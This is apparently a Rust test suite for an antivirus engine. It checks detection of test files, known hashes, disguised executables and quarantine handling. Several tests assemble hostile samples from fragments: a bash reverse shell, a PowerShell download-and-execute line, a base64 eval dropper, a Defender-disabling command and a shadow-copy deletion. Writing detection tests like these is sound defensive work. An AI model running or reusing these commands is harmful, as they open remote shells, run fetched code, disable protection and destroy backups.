//! Tests for the scanning engine. Malware samples are assembled from fragments so this file never contains a
//! working payload, and the only "malware" is the harmless EICAR and BaazCyber test files.

use baaz_engine::{quarantine::Quarantine, signatures::eicar, Kind, Scanner, SignatureDb, Severity};
use std::fs;

fn scanner() -> Scanner { Scanner::new(SignatureDb::builtin()) }
fn j(parts: &[&str]) -> Vec<u8> { parts.concat().into_bytes() }

#[test]
fn detects_the_eicar_test_file() {
    let t = scanner().scan_bytes("test.com", &eicar()).expect("EICAR is detected");
    assert_eq!(t.name, "Test.EICAR");
    assert_eq!(t.kind, Kind::Test);
}

#[test]
fn detects_the_baaz_test_file() {
    let t = scanner().scan_bytes("sample.txt", b"... BAAZCYBER-ANTIVIRUS-TEST-FILE ...").expect("Baaz test file is detected");
    assert_eq!(t.name, "Test.BaazCyber");
}

#[test]
fn clean_files_are_not_flagged() {
    let s = scanner();
    assert!(s.scan_bytes("notes.txt", b"Shopping list: milk, eggs, bread.\n").is_none());
    assert!(s.scan_bytes("app.js", b"export const add = (a, b) => a + b;\n").is_none());
    assert!(s.scan_bytes("hello.py", b"print('hello world')\n").is_none());
}

#[test]
fn known_malware_is_detected_by_fingerprint() {
    let mut db = SignatureDb::builtin();
    // Fingerprint a sample, then add that fingerprint as "known malware" and confirm it is caught.
    let sample = b"pretend this is a malware sample";
    let hash = baaz_engine::sha256_hex(sample);
    assert_eq!(db.load_hashes_text(&format!("{hash} Trojan.Win32.Test"), "Malware"), 1);
    assert_eq!(db.hash_count(), 1);
    let t = Scanner::new(db).scan_bytes("x.bin", sample).expect("known fingerprint is caught");
    assert_eq!(t.name, "Trojan.Win32.Test");
    assert_eq!(t.severity, Severity::Critical);
}

#[test]
fn flags_a_disguised_program_by_its_name() {
    let t = scanner().scan_bytes("invoice.pdf.exe", b"MZ\x90\x00 anything").expect("double extension is flagged");
    assert_eq!(t.name, "Trojan.FileName.DoubleExtension");
}

#[test]
fn flags_a_powershell_downloader_script() {
    let script = j(&["$u='http://x';I", "EX (New-Object Net.Web", "Client).Download", "String($u)\n"]);
    let t = scanner().scan_bytes("update.ps1", &script).expect("downloader is flagged");
    assert_eq!(t.name, "Trojan.Downloader.Script");
    assert_eq!(t.kind, Kind::Suspicious);
}

#[test]
fn flags_a_reverse_shell_script() {
    let script = j(&["bash -i >& /dev/", "tcp/203.0.113.9/4444 0>&1\n"]);
    let t = scanner().scan_bytes("x.sh", &script).expect("reverse shell is flagged");
    assert_eq!(t.name, "Backdoor.ReverseShell");
    assert_eq!(t.severity, Severity::Critical);
}

#[test]
fn ordinary_scripts_are_left_alone() {
    let s = scanner();
    assert!(s.scan_bytes("build.ps1", b"Write-Host 'Building'; dotnet build\n").is_none());
    assert!(s.scan_bytes("deploy.sh", b"#!/bin/sh\nnpm ci && npm run build\n").is_none());
    assert!(s.scan_bytes("setup.py", b"from setuptools import setup\nsetup(name='x')\n").is_none());
}

#[test]
fn quarantine_round_trip() {
    let tmp = std::env::temp_dir().join(format!("baaz-test-{}", std::process::id()));
    let work = tmp.join("work");
    fs::create_dir_all(&work).unwrap();
    // The Baaz test file is harmless and only BaazCyber detects it, so Windows Defender does not delete it mid-test.
    let payload = b"harmless marker: BAAZCYBER-ANTIVIRUS-TEST-FILE here";
    let infected = work.join("suspicious.bin");
    fs::write(&infected, payload).unwrap();

    let s = scanner();
    let result = s.scan_file(&infected).unwrap();
    assert!(result.threat.is_some(), "the file is detected before quarantine");

    let q = Quarantine::open(tmp.join("quarantine")).unwrap();
    let entry = q.add(&infected, &result.sha256, result.threat.as_ref().unwrap()).unwrap();
    assert!(!infected.exists(), "the original is removed");
    assert_eq!(q.list().unwrap().len(), 1);
    assert_eq!(entry.original_name, "suspicious.bin");

    // The encoded copy in quarantine is no longer the EICAR file, so a scanner skips it.
    let stored = fs::read(tmp.join("quarantine/files").join(format!("{}.quarantine", entry.id))).unwrap();
    assert!(s.scan_bytes("stored", &stored).is_none(), "the quarantined copy is not detectable or runnable");

    let restored = q.restore(&entry.id).unwrap();
    assert_eq!(restored, infected);
    assert_eq!(fs::read(&infected).unwrap(), payload, "the restored file is identical to the original");
    assert_eq!(q.list().unwrap().len(), 0);

    fs::remove_dir_all(&tmp).ok();
}

#[test]
fn base64_dropper_is_caught_but_polyfills_are_not() {
    let s = scanner();
    // A real dropper: decode base64 and run it.
    let dropper = j(&["ev", "al(at", "ob('cGF5bG9hZA=='));\n"]);
    assert_eq!(s.scan_bytes("loader.js", &dropper).unwrap().name, "Trojan.Script.DecodeExecute");
    // A polyfill assembling code from character codes is not flagged on that alone.
    let polyfill = j(&["var f = Func", "tion(String.from", "CharCode(97,108,101,114,116)); f();\n"]);
    assert!(s.scan_bytes("polyfill.js", &polyfill).is_none(), "character-code assembly alone is not a threat");
}

#[test]
fn flags_defender_tampering_and_ransomware_notes() {
    let s = scanner();
    let disable = j(&["Set-MpPre", "ference -DisableRealtimeMonitoring $true\n"]);
    assert_eq!(s.scan_bytes("x.ps1", &disable).unwrap().name, "Trojan.DisableDefender");
    let wipe = j(&["vssadmin", ".exe delete shadows /all /quiet\n"]);
    assert_eq!(s.scan_bytes("x.bat", &wipe).unwrap().name, "Trojan.DisableDefender");
}
